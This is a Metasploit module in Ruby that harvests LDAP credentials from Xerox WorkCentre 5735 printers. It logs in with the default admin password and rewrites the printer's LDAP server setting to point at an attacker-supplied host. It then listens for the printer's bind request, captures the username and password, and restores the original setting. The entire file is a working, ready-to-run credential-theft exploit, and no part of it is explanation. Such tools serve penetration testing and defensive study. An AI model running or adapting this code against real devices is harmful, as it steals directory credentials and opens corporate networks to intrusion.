##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/http'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::TcpServer
  include Msf::Auxiliary::Report

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Xerox Workcentre 5735 LDAP Service Redential Extractor',
      'Description'    => %q{
        This module extract the printer's LDAP username and password from Xerox Workcentre 5735.
      },
      'Author'         =>
        [
          'Deral "Percentx" Heiland',
          'Pete "Bokojan" Arzamendi'
        ],
      'License'        => MSF_LICENSE,
      'DefaultOptions' => { 'SSL' => false }
    ))

    register_options(
      [
        OptString.new('PASSWORD', [true, 'Password to access administrative interface. Defaults to 1111', '1111']),
        OptPort.new('RPORT', [true, 'The target port on the remote printer. Defaults to 80', 80]),
        OptInt.new('TIMEOUT', [true, 'Timeout for printer connection probe.', 20]),
        OptInt.new('TCPDELAY', [true, 'Number of seconds the tcp server will wait before termination.', 20]),
        OptString.new('NewLDAPServer', [true, 'The IP address of the LDAP server you want the printer to connect back to.'])
      ])
  end

  def run
    print_status("Attempting to extract LDAP username and password...")

    @auth_cookie = default_page
    if @auth_cookie.blank?
      print_status("Unable to get authentication cookie from #{rhost}")
      return
    end

    status = login
    return unless status

    status = ldap_server_info
    return unless status

    status = update_ldap_server
    return unless status

    start_listener
    unless @data
      print_error("Failed to start listiner or the printer did not send us the creds. :(")
      status = restore_ldap_server
      unless status
        print_error("Failed to restore old LDAP server. Please manually restore")
      end
      return
    end

    status = restore_ldap_server
    return unless status

    ldap_binary_creds = @data.scan(/(\w+\\\w+).\s*(.+)/).flatten
    ldap_creds = "#{ldap_binary_creds[0]}:#{ldap_binary_creds[1]}"

    # Woot we got creds so lets save them.#
    print_good("The following creds were capured: #{ldap_creds}")
    loot_name     = 'ldap.cp.creds'
    loot_type     = 'text/plain'
    loot_filename = 'ldap-creds.text'
    loot_desc     = 'LDAP Pass-back Harvester'
    p = store_loot(loot_name, loot_type, datastore['RHOST'], @data, loot_filename, loot_desc)
    print_good("Credentials saved in: #{p}")

    register_creds('ldap', rhost, @ldap_port, ldap_binary_creds[0], ldap_binary_creds[1])
  end

  def default_page
    page = '/header.php?tab=status'
    method = 'GET'
    res = make_request(page, method, '')
    if res.blank? || res.code != 200
      print_error("Failed to connect to #{rhost}. Please check the printers IP address.")
      return ''
    end
    res.get_cookies
  end

  def login
    login_page = '/userpost/xerox.set'
    login_vars = {
      '_fun_function' => 'HTTP_Authenticate_fn',
      'NextPage' => '%2Fproperties%2Fauthentication%2FluidLogin.php',
      'webUsername' => 'admin',
      'webPassword' => datastore['PASSWORD'],
      'frmaltDomain' => 'default'
    }
    login_post_data = []
    login_vars.each_pair{|k, v| login_post_data << "#{k}=#{v}" }
    login_post_data *= '&'
    method = 'POST'

    res = make_request(login_page, method, login_post_data)
    if res.blank? || res.code != 200
      print_error("Failed to login. Please check the password for the Administrator account")
      return nil
    end
    res.code
  end

  def ldap_server_info
    ldap_info_page = '/ldap/index.php?ldapindex=default&from=ldapConfig'
    method = 'GET'
    res = make_request(ldap_info_page, method, '')
    html_body = ::Nokogiri::HTML(res.body)
    ldap_server_settings_html = html_body.xpath('/html/body/form[1]/div[1]/div[2]/div[2]/div[2]/div[1]/div/div').text
    ldap_server_ip = ldap_server_settings_html.scan(/valIpv4_1_\d\[2\] = (\d+)/i).flatten
    ldap_port_settings = html_body.xpath('/html/body/form[1]/div[1]/div[2]/div[2]/div[2]/div[4]/script').text
    ldap_port_number = ldap_port_settings.scan(/valPrt_1\[2\] = (\d+)/).flatten
    @ldap_server = "#{ldap_server_ip[0]}.#{ldap_server_ip[1]}.#{ldap_server_ip[2]}.#{ldap_server_ip[3]}"
    @ldap_port = ldap_port_number[0]
    print_status("LDAP server: #{@ldap_server}")
    unless res.code == 200 || res.blank?
      print_error("Failed to get LDAP data.")
      return nil
    end
    res.code
  end

  def update_ldap_server
    ldap_update_page = '/dummypost/xerox.set'
    ldap_update_vars = {
      '_fun_function' => 'HTTP_Set_Config_Attrib_fn',
      'NextPage' => '/ldap/index.php?ldapindex=default',
      'from' =>'ldapConfig',
      'ldap.server[default].server' => "#{datastore['NewLDAPServer']}:#{datastore['SRVPORT']}",
      'ldap.maxSearchResults' => '25',
      'ldap.searchTime' => '30',
    }
    ldap_update_post = []
    ldap_update_vars.each_pair{|k, v| ldap_update_post << "#{k}=#{v}" }
    ldap_update_post *= '&'
    method = 'POST'

    print_status("Updating LDAP server: #{datastore['NewLDAPServer']} and port: #{datastore['SRVPORT']}")
    res = make_request(ldap_update_page, method, ldap_update_post)
    if res.blank? || res.code != 200
      print_error("Failed to update LDAP server. Please check the host: #{rhost}")
      return nil
    end
    res.code
  end

  def trigger_ldap_request
    ldap_trigger_page = '/userpost/xerox.set'
    ldap_trigger_vars = {
      'nameSchema'=>'givenName',
      'emailSchema'=>'mail',
      'phoneSchema'=>'telephoneNumber',
      'postalSchema'=>'postalAddress',
      'mailstopSchema'=>'l',
      'citySchema'=>'physicalDeliveryOfficeName',
      'stateSchema'=>'st',
      'zipCodeSchema'=>'postalcode',
      'countrySchema'=>'co',
      'faxSchema'=>'facsimileTelephoneNumber',
      'homeSchema'=>'homeDirectory',
      'memberSchema'=>'memberOf',
      'uidSchema'=>'uid',
      'ldapSearchName'=>'test',
      'ldapServerIndex'=>'default',
      '_fun_function'=>'HTTP_LDAP_Search_fn',
      'NextPage'=>'%2Fldap%2Fmappings.php%3Fldapindex%3Ddefault%26from%3DldapConfig'
    }
    ldap_trigger_post = []
    ldap_trigger_vars.each_pair {|k, v| ldap_trigger_post << "#{k}=#{v}" }
    ldap_trigger_post *= '&'
    method = 'POST'

    print_status("Triggering LDAP reqeust")
    res = make_request(ldap_trigger_page, method, ldap_trigger_post)
    res.code
  end

  def start_listener
    server_timeout = datastore['TCPDELAY'].to_i
    begin
      print_status('Service running. Waiting for connection')
      Timeout.timeout(server_timeout) do
        exploit
      end
    rescue Timeout::Error
      return
    end
  end

  def primer
    trigger_ldap_request
  end

  def on_client_connect(client)
    on_client_data(client)
  end

  def on_client_data(client)
    @data = client.get_once
    client.stop
  end

  def restore_ldap_server
    ldap_restore_page = '/dummypost/xerox.set'
    ldap_restore_vars = {
      '_fun_function' => 'HTTP_Set_Config_Attrib_fn',
      'NextPage' => '/ldap/index.php?ldapaction=add',
      'ldapindex' => 'default&from=ldapConfig',
      'ldap.server[default].server' => "#{@ldap_server}:#{@ldap_port}",
      'ldap.maxSearchResults' => '25',
      'ldap.searchTime' => '30',
      'ldap.search.uid' => 'uid',
      'ldap.search.name' => 'givenName',
      'ldap.search.email' => 'mail',
      'ldap.search.phone' => 'telephoneNumber',
      'ldap.search.postal' => 'postalAddress',
      'ldap.search.mailstop' => 'l',
      'ldap.search.city' => 'physicalDeliveryOfficeName',
      'ldap.search.state' => 'st',
      'ldap.search.zipcode' => 'postalcode',
      'ldap.search.country' => 'co',
      'ldap.search.ifax' => 'No Mappings Available',
      'ldap.search.faxNum' => 'facsimileTelephoneNumber',
      'ldap.search.home' => 'homeDirectory',
      'ldap.search.membership' => 'memberOf'
    }
    ldap_restore_post = []
    ldap_restore_vars.each_pair {|k, v| ldap_restore_post << "#{k}=#{v}" }
    ldap_restore_post *= '&'
    method = 'POST'

    print_status("Restoring LDAP server: #{@ldap_server}")
    res = make_request(ldap_restore_page, method, ldap_restore_post)
    if res.blank? || res.code != 200
      print_error("Failed to restore LDAP server: #{@ldap_server}. Please fix manually")
      return nil
    end
    res.code
  end

  def make_request(page, method, post_data)
    res = nil

    begin
      res = send_request_cgi(
      {
        'uri'       => page,
        'method'    => method,
        'cookie'    => @auth_cookie,
        'data'      => post_data
      }, datastore['TIMEOUT'].to_i)

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
      print_error("Connection failed")
    end

    res
  end

  def register_creds(service_name, remote_host, remote_port, username, password)
    credential_data = {
      origin_type: :service,
      module_fullname: self.fullname,
      workspace_id: myworkspace.id,
      private_data: password,
      private_type: :password,
      username: username
    }

    service_data = {
      address: remote_host,
      port: remote_port,
      service_name: service_name,
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data.merge!(service_data)
    credential_core = create_credential(credential_data)

    login_data = {
      core: credential_core,
      status: Metasploit::Model::Login::Status::UNTRIED,
      workspace_id: myworkspace_id
    }

    login_data.merge!(service_data)
    create_credential_login(login_data)

  end
end
